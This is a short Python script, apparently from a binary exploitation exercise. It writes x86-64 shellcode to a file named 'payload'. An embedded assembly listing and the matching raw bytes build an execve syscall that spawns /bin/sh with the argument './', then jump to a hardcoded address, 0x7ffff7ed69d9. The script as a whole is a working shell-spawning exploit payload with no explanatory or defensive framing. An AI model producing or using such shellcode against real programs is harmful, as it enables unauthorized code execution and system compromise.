#!/usr/bin/env python3

import struct

st = struct.Struct("<I")

asd = """xor rax, rax
xor rdx, rdx

push rdx

mov rcx, 0x68732f6e69622f
push rcx
mov rdi, rsp

mov rcx, 0x2f2e 
push rcx
mov rsi, rsp

push rax
push rsi
push rdi

mov rsi, rsp
mov rax, 59
mov r8, 0x7ffff7ed69d9
push r8
ret"""

f = open('payload','wb')

#adress = st.pack(0x7ffff7ed69d9)

payload = b'\x48\x31\xc0\x48\x31\xd2\x52\x48\xb9\x2f\x62\x69\x6e\x2f\x73\x68\x00\x51\x48\x89\xe7\x48\xc7\xc1\x2e\x2f\x00\x00\x51\x48\x89\xe6\x50\x56\x57\x48\x89\xe6\x48\xc7\xc0\x3b\x00\x00\x00\x49\xb8\xd9\x69\xed\xf7\xff\x7f\x00\x00\x41\x50\xc3'

f.write(payload)

f.close()